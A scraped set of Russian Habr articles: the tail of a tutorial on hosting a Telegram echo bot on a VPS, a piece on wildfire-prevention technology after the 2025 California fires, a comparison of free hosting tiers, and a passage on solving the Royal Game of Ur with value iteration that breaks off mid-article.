После скопируйте код бота и вставьте его в текстовый файл — он будет выводить «Привет, мир!»
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
BOT_TOKEN = ""ВСТАВЬ_СЮДА_СВОЙ_ТОКЕН""
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(""Привет, мир! Я бот :)"")
async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(update.message.text)
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler(""start"", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
    app.run_polling(stop_signals=None)
if name == ""__main__"":
    main()
Важно, чтобы токен был именно в кавычках — без них бот не будет работать. Сохраняем файл и выходим — в Nano это делается сочетанием клавиш Ctrl+O и Ctrl+X.
Шаг 3. Запуск бота. Осталось совсем немного! Запускаем файл, который мы ранее создали: 
python bot.py
После остается только найти бот в Telegram по названию и отправить /start — бот должен с вами поздороваться.
Вот так выглядит самый минимальный деплой бота на виртуальный сервер. Я намеренно тут избегал темы установки UFW и настройки автозапуска с помощью systemd, чтобы не перегружать инструкцию и сохранить ее максимально легкой. 
А вы уже пробовали размещать своих ботов на сервере? Или, может, есть идея для бота, которую давно хотите реализовать — но не знали, с чего начать? Делитесь в комментариях!"
Почему Калифорния до сих пор горит — и как технологии могут это исправить,https://habr.com/ru/companies/first/articles/910054/,"Начало 2025 года выдалось тяжелым для жителей Калифорнии: причем как рядовых, так и суперзвёзд Голливуда. Всему виной разрушительные пожары, охватившие территорию 163 квадратных километра. А это, на с...","Начало 2025 года выдалось тяжелым для жителей Калифорнии: причем как рядовых, так и суперзвёзд Голливуда. Всему виной разрушительные пожары, охватившие территорию 163 квадратных километра. А это, на секундочку, больше площади Парижа. Погибли 29 человек, более 200 тысяч эвакуировались, ущерб превысил 250 млрд долларов США. 
Причины этих пожаров — целый комплекс факторов, разом свалившихся на один из самых благополучных штатов Америки. Но на самом деле есть несколько технологий, которые могли бы помочь предотвратить столь разрушительные последствия.
Причины пожаров в Калифорнии
Давайте вернемся в прошлое и проанализируем факторы на примере серии из 14 пожаров в округах Лос-Анджелес и Сан-Диего, случившихся с 7 по 31 января 2025 года. Начнем с климатических.  
Причина 1. Засуха
Калифорния всегда была настоящим раем для возникновения и распространения лесных пожаров. Всему виной теплый и засушливый климат. Например, по данным CalFire (агентство, занимающееся сбором статистики), приведенным в статье The New York Times, с 1800-х годов в регионе произошло 12 500 пожаров (это много). Причем их частота растет: вот данные по миллионам выгоревших акров с 1979 по 2018 годы.
Аналогичная статистика для крупных пожаров с площадью более 10 000 акров. Красная линия на графике — это 10-летняя скользящая средняя, которая показывает общий тренд, сглаживая резкие колебания данных. Такой метод помогает увидеть, растёт ли число пожаров в долгосрочной перспективе, исключая влияние случайных пиков и провалов.
Многие специалисты связывают это с общим изменением климата на планете: среднегодовая температура в Калифорнии действительно повышается. 
Но ситуация усугубилась тем, что в 2022-2024 годах регионы сначала накрывали мощные дожди, которые приводили к обильному росту кустарников, травы и деревьев. После этого наступала резкая и продолжительная жара на 9-10 месяцев, которая буквально высушивала все вокруг и превращала растительность в идеальное топливо для огня.  
Опасная ситуация была вполне предсказуемой: Национальная метеорологическая служба США (National Weather Service, NWS) начала предупреждать об особенно высоком риске пожаров ещё с ноября-декабря 2024 года. Основой для прогнозов стали данные о длительной засухе, высоких температурах, низкой влажности и сильных порывах ветра — классических условиях для стремительного распространения огня. В таких случаях NWS присваивает округам, таким как Лос-Анджелес и Вентура, красный флаг «особенно опасной ситуации», чтобы предупредить местных жителей и службы о повышенной угрозе.
Причина 2. Ветер
Но одной засухи мало для того, чтобы пожар распространялся с такой невероятной скоростью и такими катастрофическими последствиями. Так совпало, что засуха по времени совпала с усилением ветров Дьябло и Санта-Ана с севера и северо-востока страны, пришедших из пустынных местностей. Порывы последнего достигали 20-40 м/с и пролегали как раз через густонаселенные районы, дополнительно выдувая влажный воздух.
Ветры Санта-Аны традиционно повышают риски пожаров. Но произошедшее в начале 2025 года было чем-то из ряда вон
Вот последствия на спутниковом снимке
Офис NWS накануне бедствия, в первых числах января, предупредил, что порывы ветра могут привести к падению деревьев и обрывам линий электропередачи, что «существенно повышает риски возникновения и распространения пожаров». Именно так и произошло.
На карте обозначены все зоны возгорания: большая часть как раз на пути ветров из глубины региона
Но главный вопрос: что именно вызвало первую искру? И почему последствия были столь разрушительными? Тут в дело вступает человеческий фактор.
Причина 3. Аварии на линиях электропередач
По данным Лесной службы США, с 1992 по 2024 год более 3600 пожаров в Калифорнии напрямую связаны с проблемами на опорах и линиях электропередач. Вот статистические данные — жирным шрифтом выделены пожары, которые случились по этой причине:
В таблице приводятся год возникновения пожаров, название и количество уничтоженных строений
Вот некоторые примеры с подробностями:
2017 год — пожар Thomas, как показало официальное расследование, начался после падения опор ЛЭП на сухой материал. Возникшая искра в сочетании с сильным ветром привела к пожару, который продолжался 40 дней. 
2018 год — пожар Camp произошел из-за электрической дуги между линией электропередач Pacific Gas & Electric, один из изоляторов которой оказался изношен, и стальной вышкой. Дуга нагрела металл до температуры 3000-5000˚С, он расплавился и попал на сухую траву под опорой. Пожар унес жизни 80 человек.
2021 год — пожар Dixie случился из-за падения дерева на линию ЛЭП Pacific Gas & Electric, при этом защитного отключения не произошло. Выгорел почти миллион акров в четырех округах. 
Тенденция с причинами пожара очевидна, поэтому жители Алтадены подали в суд на компанию Southern California Edison (SCE) — основного поставщика электроэнергии на большей части территории Южной Калифорнии, посчитав, что именно она должна компенсировать убытки.
В заявлении юридической фирмы Bridgford, Gleason & Artinian говорится о неспособности SCE обесточить провода, пересекающие каньон, несмотря на предупреждения метеорологов о сильном ветре с красным уровнем опасности. В иске также сказано, что обвинение основано на собственном расследовании, консультациях с экспертами, публичных заявлениях представителей SCE и видеоматериалах с обрывами проводов.
Причина 4. Проблемы властей
Когда начались первые возгорания, все службы экстренного реагирования были направлены на их ликвидацию. Но они сразу столкнулись с несколькими серьёзными проблемами:
Нехватка воды. Гидранты быстро опустели. Расследование прессы показало, что водохранилище Санта-Инез в районе Пасифик-Палисейдс, которое должно было вмещать 117 миллионов галлонов воды и использоваться как раз для противопожарных нужд, оказалось пустым. И причина крылась не только в засухе. Департамент водных ресурсов и энергетики Лос-Анджелеса весь 2024 год готовился к ремонту стенок водохранилища, но не торопился. 
Другой момент: старые трубы и насосное оборудование не были рассчитаны на подобные расходы воды.  
Плотная застройка старыми домами. По словам пожарных, разрушительная сила лесных пожаров увеличилась, поскольку в зоне бедствия находилось слишком много старых домов 50-60-х годов постройки в зоне повышенного риска. Согласно Строительному кодексу Калифорнии (California Building Standards Code, Title 24), здания в районах с высоким риском возгорания должны использовать негорючие материалы и иметь специальные меры противопожарной защиты. Однако в Палисейдс эти требования часто игнорировались, и многие старые дома не были модернизированы.
Нехватка финансирования. По некоторым данным, бюджет пожарной охраны Лос-Анджелеса (LAFD) во втором квартале 2024 года был сокращен на 17 млн долларов. Из-за этого в бригадах не хватало сотрудников, а техника не ремонтировалась. 
Для понимания масштаба бедствия — фотография дыма от пожара в Палисейдс над заливом Санта-Моника в 8:40 утра 10 января 2025 года
Причина 5. Другие факторы
Сюда относятся, например, случайные поджоги из-за несоблюдения туристами техники безопасности и предупреждений, или удары молнии. Причем деятельность человека значительно перевешивает: по данным анализа за 20 лет, речь идет о 84% случаев пожаров по всей территории США. 
Это не относится к конкретному пожару в Калифорнии 2025 года, но является важным фактором для других случаев. Вот диаграмма за 2020 год:
Как видно, проблема возгораний из-за электрических линий — самая остра
Но если отбросить политические аспекты — вроде сокращения финансирования, умышленных поджогов и глобальных изменений климата, — остаётся главный вопрос: могут ли современные технологии помочь контролировать очаги возгорания в лесах и предотвращать столь разрушительные последствия, как в Калифорнии?
Давайте разберем несколько интересных решений, которые уже внедрены или только тестируются.  
REFCL и IND: защита и контроль обрыва линий электропередач
Многие энергетические компании в Калифорнии, включая Southern California Edison (SCE), активно ищут решения для снижения риска пожаров, связанных с линиями электропередач. Вот несколько решений, которые помогают предотвращать подобные инциденты:
Прокладывать линии электропередач под землёй — идея, конечно, не новая, но дорогая. Примерно в 5–10 раз дороже, чем тянуть их по столбам, и гораздо сложнее в обслуживании. Плюс надо решать такие задачи, как поиск аварий и отведение тепла. Для примера, США сейчас выделяют $4,3 млрд на восстановление подземной сети Пуэрто-Рико, которая регулярно страдает от ураганов. Но в масштабах Калифорнии счёт пошёл бы на сотни миллиардов и десятилетия работы.
Вариант попроще — сотни «микросетей», где энергия передаётся не через один огромный кабель, а через много мелких, распределённых по сети. Если где-то что-то порвётся, остальная система всё равно будет работать. Так, например, уже тестируют сети Ameren в Иллинойсе и Миссури. Но опять же, для Калифорнии это всё звучит как фантастика.
А теперь к более реальным решениям. SCE вместе с правительством австралийского штата Виктория вложили десятки миллионов долларов в разработку REFCL (Rapid Earth Fault Current Limiter) — ограничителей тока быстрого замыкания на землю. Почему в Австралии? Потому что именно там в 2009 году произошёл один из самых страшных пожаров, вызванных обрывом проводов, который унёс 173 жизни.
REFCL работают просто: когда линия обрывается и касается земли или дерева, система всего за 40 мс снижает напряжение повреждённой линии до безопасных 100 В. И тут всё зависит от скорости. Профессор Тони Марксен из Университета Монаша, который помогал разрабатывать эту технологию, говорит: «Если система сможет сделать это в течение 85 мс, пожаров не будет».
Технология основана на принципе дугогашения, который придумал немецкий инженер Вальдемар Петерсен ещё в 1914 году. Его катушка, подключенная между нейтралью и землёй, может снизить ток утечки с десятков ампер до менее 0,5 А — что почти гарантированно исключает возгорание.
Упрощенная схема. Дугогасительная катушка работает в комбинации с инвертором-ограничителем тока замыкания
Прелесть REFCL ещё в том, что отключение одной неисправной линии не приводит к масштабному отключению электроэнергии. Распределительные цепи 22 кВ в Виктории состоят из трёх параллельных линий. Пока напряжение падает на неисправной линии, REFCL временно перенаправляет свою мощность на две другие линии цепи. Потребитель никогда не узнает, что произошёл сбой. При этом риск пожара существенно снижается.
Видео с результатом работы REFCL — упавший кабель не воспламеняет сухую траву:
Другой подход — использовать сверхчувствительные датчики для раннего обнаружения неисправностей. Например, система EFD от компании IND Technology. Она объединяет электромагнитные сенсоры, которые отслеживают сигналы частотой от 1 МГц до 130 МГц, и систему управления, которая анализирует эти данные в реальном времени. Если где-то намечается обрыв кабеля или сбой трансформатора, система немедленно подаёт сигнал тревоги.
Датчики размещаются вдоль линии с интервалом в 4,8 км, что позволяет определять проблемные места с точностью 5-10 метров. Это достигается благодаря синхронизации сигналов между датчиками и их перекрёстной калибровке, что позволяет точно вычислить источник проблемы.
Сама технология прошла первые испытания в штате Виктория ещё несколько лет назад — на 250-километровом участке линии электропередач. Результаты оказались настолько впечатляющими, что системы EFD уже используются в Австралии, а в США их планируют внедрить в сетях некоторых распределительных компаний, включая SCE и PG&E.
Firescape и Burnbot: прогноз и очистка зоны повышенного риска от сухой растительности и мусора
Один из методов борьбы с пожарами — уменьшить количество легковоспламеняющейся растительности. Но просто сжигать всё подряд — не лучший выход: это дорого, небезопасно и вызывает много дыма. Тут на помощь приходят стартапы вроде Firescape.
Firescape — это комплексная платформа для прогнозирования лесных пожаров. Она анализирует данные с разных источников:
прогноз погоды;
геодезические карты местности;
отчёты коммунальных служб о состоянии оборудования;
спутниковые снимки;
видеокамеры, установленные на городских окраинах;
исторические данные о распространении пожаров.
Эта информация загружается в систему машинного обучения, которая строит вероятностные модели возникновения и распространения пожаров. Такой подход позволяет коммунальным службам точнее планировать профилактические меры, вроде расчистки зон с высокой концентрацией сухой растительности.
«Наш инструмент оптимизирует выходные данные о поведении лесного пожара, такие как скорость распространения или интенсивность. После чего определяет, где следует проводить обработки, чтобы минимизировать риски, — говорит Холли Иглстон, основательница стартапа. — По сути, Firescape решает вопрос вероятности возгорания».
Система собирает множество данных, обрабатывает и выдает прогноз
Аналогичная программа FireAid на основе ИИ сейчас тестируется в Турции при поддержке стран ВЭФ. Они просто посчитали, что дешевле инвестировать в высокотехнологичное решение, чем потом бороться с последствиями, которые оцениваются в 50 миллиардов долларов ежегодно. По предварительным данным, точность прогнозов FireAid достигает 80% за 24 часа до начала пожара.
Карта с прогнозированием лесных пожаров, формируемая FireAid
Но даже если известно, где требуется расчистка, это не значит, что её можно легко организовать. Иногда зона повышенного риска находится слишком далеко, а иногда — слишком близко к жилым районам, где дым будет мешать людям.
Тут появляется Burnbot — парк мобильных систем для безопасного сжигания растительности. Они работают как гигантские роботы-пылесосы, передвигаясь по заранее заданным маршрутам, сформированным на основе данных от систем вроде Firescape или FireAid.
Эти машины минимизируют выбросы едкого дыма и снижают риск случайного возгорания, что делает их отличным решением для сложных условий, где обычные методы не срабатывают. К тому же, в некоторых версиях Burnbot предусмотрены сенсоры для обнаружения мелких животных, что снижает риск их гибели во время расчистки.
Роботы создают своеобразное ограждение, за пределы которого искусственный пожар не распространится
По словам основателя стартапа Ли Хаддада, роботы работают без выходных, при любых погодных условиях и во много раз эффективнее традиционных методов
Pano AI и OroraTech: камеры и спутники для обнаружения пожаров
В Калифорнии, наиболее страдающей от лесных пожаров, недавно появился стартап Pano AI. Он предлагает другой подход к раннему обнаружению возгораний: сеть камер, расположенных на возвышенных участках, каждая из которых вращается на 360° раз в минуту и непрерывно сканирует лесной массив в радиусе 15 км в режиме реального времени.
Поток видео анализируется нейросетью, обученной распознавать первые признаки пожара — струйки дыма. Алгоритмы модели используют bounding box (ограничивающие рамки) и позволяют отличить дым от облаков, тумана или пыли. После обнаружения и подтверждения координаты очага возгорания отправляются в местные службы оперативного реагирования.
«Такой уровень интеграции помогает пожарным реагировать очень быстро, даже когда площадь возгорания не превышает 10 акров. Это позволяет пресекать пожар в самом зародыше», — говорит директор стартапа Соня Кастнер.
Похожий подход используют сотрудники Калифорнийского университета Сан-Диего, разработавшие систему ALERTCalifornia. Она включает 1144 камеры высокой чёткости с инфракрасным ночным видением, которые уже покрывают сотни квадратных километров вокруг Лос-Анджелеса. Данные с этих камер собираются и хранятся на университетских серверах, где обрабатываются ИИ и отправляются в местные пожарные службы.
Любой желающий может пройти по ссылке и посмотреть работу системы
А компания OroraTech из Мюнхена пошла ещё дальше, запустив партию из 100 низколетящих спутников размером с обувную коробку. Эти спутники оборудованы инфракрасными датчиками, отслеживающими необычные повышения температуры и передающими данные в облако для дальнейшего анализа.
К концу 2025 года OroraTech планирует увеличить парк спутников до такого количества, чтобы любая точка Земли сканировалась не реже, чем раз в 30 минут. По словам инженера компании Кристиана Мольера, «эта технология сыграла важную роль в борьбе с лесными пожарами в Чили в прошлом году и помогла ликвидировать их меньше, чем за сутки».
Посмотрите видео о том, как работает система OroraTech
Dryad Networks: комплексная борьба с пожарами на основе БПЛА и IoT
Пожалуй, самый амбициозный подход к раннему тушению лесных пожаров предложил немецкий стартап Dryad Networks. Их идея — сделать процесс максимально автономным, свести участие человека к минимуму и полагаться на сеть датчиков и беспилотников. Для этого разработана трёхуровневая система:
IoT-датчики: Устанавливаются прямо в лесных массивах и собирают данные о температуре, влажности, уровне CO₂, скорости и направлении ветра, а также концентрации продуктов горения. По сути, это миниатюрные метеостанции, работающие на солнечных батареях и размещенные так, чтобы кроны деревьев не мешали прохождению света.
БПЛА Florian: Парк беспилотников, работающих на солнечной энергии и оборудованных системами подавления возгораний с помощью акустических волн. По принципу работы это чем-то напоминает мощные звуковые сабвуферы, но направленные на тушение огня. Пример можно увидеть в этом видео.
Система Silvanet: Соединяет всё это воедино, обрабатывая данные с датчиков и координируя дроны в автоматическом режиме. Если начальный этап тушения не сработал, система отправляет сигнал в местные пожарные службы для подключения тяжёлой техники.
И хотя всё это звучит как сюжет из научной фантастики, технология уже вышла из лабораторий и проходит тестирование.
Пара слов о будущем
В итоге сегодня есть сразу несколько перспективных направлений, которые могут помочь бороться с лесными пожарами на ранних стадиях. Некоторые решения, вроде REFCL в Австралии, уже доказали свою эффективность и требуют только масштабирования для применения в крупных регионах вроде Калифорнии. Другие, как Burnbot или Dryad Networks, пока проходят тесты, и на их внедрение может уйти не один год.
Конечно, помимо технологий, ещё можно:
Ужесточать наказания за умышленные поджоги и строже контролировать доступ в леса при высоких уровнях пожарной опасности.
Увеличивать финансирование противопожарных служб (или хотя бы не сокращать его, как это произошло в Калифорнии).
Проводить более активные программы по борьбе с изменением климата, включая восстановление экосистем.
Но тут сразу напрашивается мем с Каневским из серии: «Но количество пожаров из-за пьяных туристов, конечно, меньше не стало».
Тем не менее что-то делать всё равно нужно. И использование современных технологий выглядит более реалистичным вариантом, чем утопические мечты о сознательных гражданах, ответственных политиках и спасении планеты с помощью электромобилей.
НЛО прилетело и оставило здесь промокод для читателей нашего блога:
-15% на заказ любого VDS (кроме тарифа Прогрев) — HABRFIRSTVDS"
Где бесплатно хостить пет-проект с собственным доменным именем,https://habr.com/ru/articles/910050/,"У меня есть несколько персональных пет-проектов, где я тестирую различные технологии, сервисы и библиотеки или упрощаю собственную жизнь (например, персональный трекер с единственным пользователем - м...","У меня есть несколько персональных пет-проектов, где я тестирую различные технологии, сервисы и библиотеки или упрощаю собственную жизнь (например, персональный трекер с единственным пользователем - мной). Иногда хочется захостить эти проекты за пределами личного ноутбука, а еще лучше если есть возможность прикрутить собственный домен, чтобы можно было делиться с другими людьми. Так как все это абсолютно не коммерческие истории, то платить деньги за хостинг не очень хочется. Раньше для таких целей я пользовался Heroku, но еще несколько лет назад они закрыли бесплатный тариф. В очередной раз столкнувшись с желанием захостить свой проект я решил изучить вопрос.
Найденные варианты я собрал в табличку, актуальную на май 2025. ChatGPT o3 наврал в ответах, поэтому пришлось добавлять, фильтровать и перепроверять данные вручную. К сожалению, приходится сравнивать “яблоки с попугаями”, потому что каждый Cloud провайдер рассчитывает стоимость хостинга немного “по-своему” и включает в бесплатный тариф только часть функциональности.
Провайдер
Что можно развернуть на free-tier
Лимиты free-tier (детали по ссылке)
Как подключить свой домен
GitHub Pages
Статический сайт
∞ build minutes,
1GB repo
Документация
Vercel (Hobby)
Full-stack app
200 projects
6000 build minutes
Документация 
Netlify (Free & Starter)
Статический сайт, Full-stack app, Cloud Functions
100 GB bandwidth, 
300 build minutes
Форум 
Cloudflare Pages
Статический сайт, Cloud Functions
500 builds/months
Документация
Google Cloud Run  (Free tier)
HTTP container
180k-240k vCPU-sec/month
360k-450k GiB-sec/month
Документация
Render (Free Web Service / Static)
Node/Go/Docker, cтатический сайт
0.1 CPU, 512Mb RAM
Документация
Koyeb (Starter)
Web контейнер, Postgres
1 Web Service + 1 DB
Документация
Glitch (Starter)
Full-stack app, статический сайт
Full-stack apps (sleep after 5 minutes)
∞ static sites( always on)
Форум
Azure Static Web Apps (free tier)
Статический сайт
0.5 Gb storage,
100 GB bandwidth
Документация
AWS Free Tier (Free tier)
Статический сайт, Full-stack app, Cloud Functions
1M cloud functions
Документация
Яндекс Облако (Free tier)
VM f1-micro, Object Storage
1M cloud functions
Документация 
Azure (Free tier)
Статический сайт, Cloud functions
1M cloud functions
Документация
Чем пользуюсь лично я:
GitHub Pages - для статического сайта-визитки.
Vercel - для персонального блога на собственном домене с бекэндом и базой данных.
Причины: наличие v0 для вайб-кодинга, нет “засыпания” приложения, наличие бесплатного тира Supabase прямо в Vercel, очень удобная интеграция с GitHub.
Впечатления: крайне положительные, очень нравится, проблем пока не было.
Google Colab - для Python скриптов (DS / ML) в Jupyter Notebook.
Причины: Google Colab для DS / ML - это де-факто стандарт, удобно делиться с знакомыми, можно редактировать и запускать ноутбуки с любого персонального девайса, изолированная среда без необходимости возиться с conda самостоятельно, можно запускать долго-выполняющиеся скрипты в фоне. 
Впечатления: полет нормальный, но иногда бесплатных мощностей не хватает и приходится либо доплачивать, либо гонять локально.
Google Cloud (включая AI Studio) - для всего остального.
Причины: наличие бесплатных 300$ на GCP сервисы на 3 месяца, мощная Gemini-2.5-pro, бесплатные лимиты на некоторые модели семейства Gemini-2.0, хочется попрактиковаться именно с Google Cloud.
Впечатления: позитивные, соответствует ожиданиям.
Если нужно хранить данные граждан РФ, то единственным найденным бесплатным вариантом является Yandex Cloud.
Буду благодарен дополнениям и личному опыту в комментариях.
Данный пост является исключительно личным мнением автора, может не совпадать с позицией редакции или работодателя автора.

Еще больше авторских постов про AI, разработку и стартапы у меня в TG‑канале: присоединяйтесь."
Математическое решение царской игры Ура,https://habr.com/ru/articles/907912/,"Мы потратили семь лет на эксперименты с ИИ для царской игры Ура, и, наконец, пришли к сильному решению по правилам Финкеля, Блица и Мастерса! В конечном итоге, для этого понадобилась пара красивых ура...","Мы потратили семь лет на эксперименты с ИИ для царской игры Ура, и, наконец, пришли к сильному решению по правилам Финкеля, Блица и Мастерса! В конечном итоге, для этого понадобилась пара красивых уравнений, которые я объясню в статье.
На самом деле, мы не «просто» нашли сильное решение игры. Для сильного решения необходимо находить наилучший ход из каждой позиции. Мы сделали это, плюс вычислили точную вероятность победы каждого игрока при оптимальной игре из каждой позиции. Для этого мы воспользовались нашей опенсорсной библиотекой RoyalUr-Java.
Ниже мы опишем, как это работает. Также мы написали технический отчёт.
Идеальная партия
Прежде, чем переходить к подробностям, покажем небольшое живое демо. В нём два бота участвуют в ничейной дуэли — это идеальная партия! Лично меня это завораживает. Как часто вам доводится наблюдать за чем-то математически идеальным?
Идеальная партия в Royal Game of Ur между двумя ботами. Чтобы ускорить игру, мы не отображаем кости. Вы сами можете сыграть с идеальным ботом.
Идеальность означает максимизацию вероятности выигрыша
Чтобы создать идеально играющего бота, нужно чтобы он максимизировал свою вероятность выигрыша.
В отличие от шахмат или го, при игре в царскую игру Ура нельзя заранее спланировать идеальную победу. Этого не позволят сделать кости! Из-за этого решение царской игры Ура фундаментально отличается от решения игр без вероятностей.
Вместо того, чтобы планировать единственный путь к победе, нам нужно учитывать каждый возможный будущий путь, который становится возможен или невозможен из-за бросков костей, а затем взвесить их все при выборе ходов. Это взвешивание вариантов будущего развития делает решение игры Ура больше похожей на решение покера, чем шахмат.
Для обработки вероятностей мы используем итерации состояний среды
Как же вычислить, какой ход максимизирует вероятность нашей победы, если до конца игры может пройти сотни ходов? Мы используем для этого итерацию состояний среды.
Итерация значений позволяет нам воспользоваться преимуществом игры Ура, а именно относительно низким количеством состояний. Например, по правилам Финкеля есть всего 276 миллионов состояний. Этот размер достаточно мал для того, чтобы можно было хранить весь граф состояний для правил Финкеля в памяти. Затем можно использовать итерацию состояний среды для распространения вероятности выигрыша или проигрыша обратно на весь процесс игры.
Имитация состояний среды обратным распространением потока состояний по графу.
Выше показан упрощённый пример того, как итерация состояний среды модифицирует граф. Значения перемещаются от состояния к состоянию, изначально из состояний победы или проигрыша, а затем обратно, к началу игры. В этом примере значение, к которому приходит каждое состояние — это вероятность оказаться во состоянии победы, если выполнить случайный переход из этой точки.
В более крупных графах, например, в графе царской игры Ура, я предпочитаю воспринимать итерацию состояний среды, как симуляцию жидкости. «Вероятность выигрыша» — это жидкость, которая медленно течёт обратно по всей партии игры. Особенно удобно то, что вероятности, к которым приходит итерация состояний среды — это наша вероятность выигрыша!
Анимация процесса вычисления вероятности выигрыша игрока светлыми фишками из каждой позиции игры
Как работает итерация состояний среды?
Основной принцип итерации состояний среды таков: мы распространяем победы и проигрыши обратно.
Пример: если вы знаете, насколько хороши следующие позиции, которых вы можете достичь, то можете вычислить, насколько хороша текущая позиция. А зная, насколько хороша эта позиция, можете вычислить, насколько хороши были позиции до неё и так далее...
При помощи этой методики мы можем пройти назад по всей игре, обновляя значения состояний на основании состояний, идущих после них.
Обратный проход
Этот обратный проход реализован с помощью простого взвешенного среднего. Вероятность выигрыша в одном состоянии равно взвешенному среднему вероятности выигрыша во всех состояниях после каждого броска костей (пока мы не будем рассматривать выбор хода).
При помощи этой простой операции мы каскадно распространяем победы и проигрыши по пространству царской игры Ура.
Достаточно ли этого? К сожалению, нет. Из-за петель в графе состояний одного обратного прохода оказывается недостаточно. Есть неудобные позиции, в которых можно сыграть множество ходов и вернуться к той же позиции, которая была до них. Основная ценность итерации состояний среды заключается в решении этих петель.
Вычисление вероятности выигрыша в одной позиции на основании соседних позиций, которых игрок достигнет после броска костей
Нам понадобится множество обратных проходов
Именно благодаря итерации мы можем работать с петлями. Вместо того, чтобы делать один обратный проход, мы выполняем несколько. При каждом выполняемом проходе наши оценки вероятности выигрыша из каждой позиции становятся точнее.
Недостаточность одного обратного прохода из-за петель вызвана тем, что процент выигрыша в некоторых состояниях будет некорректным, если использовать его для вычисления вероятности выигрыша другого состояния. Их значение некорректно, потому что только что вычисленное состояние может влиять на состояния, использованных в этих вычислениях (циклическая зависимость)!
Диаграмма, показывающая, как взятие фишки может привести к петле в посещаемых состояниях игры
Оказывается, было доказано, что используемые нами уравнения со временем сходятся. Мы знаем это, потому что уравнения, применяемые нами для решения царской игры Ура — это формулировки уравнений Беллмана. А в математике доказано, что уравнения Беллмана со временем сходятся.
Как оценивать ходы, которые делают противники?
Это очень важная особенность! И она тесно связана с ограничением решений любых игр, содержащих вероятности.
В любой игре, содержащей вероятности, лучшая стратегия выигрыша сильно зависит от того, что делает противник. Однако мы не можем спрогнозировать особенности и склонности каждого игрока. Поэтому мы предполагаем, что оба игрока играют оптимально, делая по очереди наилучшие ходы.
Исходя из предположения об оптимальной игре противников, мы можем вычислить стратегию, при которой ни один из игроков не может повысить свою вероятность победы изменением своих ходов. Такой тип стратегии называется равновесием Нэша. Эту стратегию невозможно победить. Но в то же время эта стратегия не всегда замечает и использует погрешности в игре противника. Нам приходится идти на этот компромисс.
Оказалось, что для вычисления оптимальной игры достаточно простого «жадного» решения. В каждом состоянии мы предполагаем, что игрок совершит ход, который приведёт к наибольшей вероятности выигрыша. Хотя процент победы, используемый нами для принятия этого решения, поначалу может быть некорректным, он всё равно достаточно хорош, чтобы проценты выигрыша со временем могли сойтись.
Внутри нашего ядра итерации состояний среды выбор оптимального хода для каждого игрока представлен максимумом или минимумом среди значений его возможных ходов.
Окончательный обзор итерации состояний среды
Итак, мы поняли, как можно вычислять значение одного состояния на основании других состояний. Давайте объясним, как эти части объединяются в конечное множество уравнений, и как мы применяем их для создания решённой таблицы игры.
Взвешенное среднее и выбор хода образуют простое ядро. Это ядро комбинирует взвешенное среднее с нашим оптимальным выбором хода. Мы итеративно применяем это ядро ко всем состояниям в игре снова и снова, пока вероятности выигрыша не сойдутся. Применяя это ядро, мы используем его для обновления значений V(state) в таблице, пользуясь другими значениями из той же таблицы.
Нашим конечным результатом становится таблица состояний и значений. Создаваемая конечная таблица будет содержать наши оценки вероятности выигрыша каждого игрока из каждой позиции. Далее мы можем использовать эту таблицу, чтобы обеспечить оптимальную игру агентов, заставив их выбирать ход, приводящий в состояние с наибольшей вероятностью победы.
В этом и заключается итерация состояний среды! Она позволила нам решить царскую игру Ура с точностью, ограниченной лишь точностью 64-битных чисел с плавающей запятой. В случае правил Финкеля это означает вычисление вероятности победы с точностью до 3E-14%, или 0,00000000000003%. Мне кажется, это очень круто.
А теперь давайте ускорим вычисления! Настало время оптимизации.
Процесс, выполняемый итерацией состояний среды для поиска идеального решения
Урезаем игру ради скорости!
Выполнение итерации состояний среды для всей игры — это и затратно, и неэффективно. В течение тысячи итерации, необходимых для обучения наших моделей, возникла лишь узкая граница состояний, со временем сходящихся к своему истинному значению. Состояния, более близкие к состоянию победы, уже сошлись, а у отдалённых состояний ещё недостаточно информации для схождения.
Нам бы очень хотелось обновлять только те состояния, которые близки к схождению на каждой итерации, чтобы не тратить время на обновление всех остальных. К счастью, есть один хитрый трюк, позволяющий это сделать!
После вывода фишки с доски вернуть её невозможно.
Выведя фишку, её нельзя вернуть [прим. пер.: по правилам в интерпретации Финкеля для победы игроку нужно вывести все свои фишки с поля]. Эта, казалось бы, несущественная деталь даёт нам огромное преимущество: она разрывает все петли в графе состояний. Поэтому состояния после вывода фишки не могут зависеть от состояний до них.
Это очень важно! Это позволяет нам разбить одну большую игру Ура на множество мелких «мини-игр». После вывода фишки мы переходим от одной мини-игры к другой. Благодаря этому мы получаем преимущество при обучении моделей, потому что каждая из этих мини-игр зависит только от собственных состояний и от состояний, следующих мини-игр, которых можно достичь.
Поэтому можно обучать модель не всей игре целиком, а одной за другой каждой из этих маленьких игр. А поскольку каждая из этих мини-игр намного меньше целой партии, обучаться им можно более эффективно с гораздо меньшей тратой лишних ресурсов! Благодаря этому время решения игры по правилам Финкеля на моём M1 Macbook Pro снизилась с 11 часов до менее чем 5 часов.
Группы, в которые мы упорядочиваем состояния — это «мини-игры» и их зависимости. Показанные на изображении группы описывают правила для трёх начальных фишек.
Хранение всех вероятностей победы в плотно упакованной таблице
Ещё один важный при решении царской игры Ура вопрос — обеспечение эффективного использования памяти.
Нам нужна таблица поиска для каждой позиции игры вероятности того, что игрок выиграет, начиная с этой позиции. Для правил Финкеля (самых популярных) это означает создание карты из 275827872 уникальных позиций. Для правил Мастерса она ещё крупнее, более миллиарда позиций.
Как же нам создавать эти большие таблицы? Мы решили, что лучше всего ещё больше усложнить процесс! Нас волновало использование памяти, поэтому создали собственную реализацию таблиц, оптимизированную под этот аспект.
Наши таблицы состоят из плотно упакованных двоичных ключей и значений. Мы не хэшируем ключи для поиска элементов, как это делается обычно, а сортируем ключи и используем двоичный поиск. Это позволяет сохранять минимально возможный размер таблиц, обеспечивая при этом высокую скорость.
Благодаря нашей переусложнённой таблице мы можем снизить потребление памяти до всего 12 байтов на каждый элемент таблицы, то есть полное решение по правилам Финкеля уместится всего в 1,6 ГБ. А сжатые версии занимают всего 827 МБ, если вас устроит точность в пределах 0,01%.
Визуализация различий структур памяти между хэш-таблицами и нашей реализацией таблицы.
Запись состояний игры в 32-битные ключи
